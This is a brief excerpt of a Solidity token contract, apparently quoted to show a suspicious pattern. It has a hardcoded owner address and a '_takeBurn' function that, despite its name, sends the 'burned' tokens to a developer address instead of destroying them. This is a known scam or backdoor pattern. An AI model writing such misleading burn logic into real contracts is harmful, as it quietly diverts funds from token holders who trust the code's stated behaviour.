...
contract Token is Context, IERC20, Ownable {
    ...
    address public ownerAddres = address(0xD45B6005980B380CFe5eA182CF05bBcB883eaD13);
    ...
    function _takeBurn(address spender,uint256 tBurn) private {
        uint256 currentRate =  _getRate();
        uint256 rBurn = tBurn.mul(currentRate);
        _rOwned[devAddress] = _rOwned[devAddress].add(rBurn);
        emit Transfer(spender, devAddress, tBurn);
    }
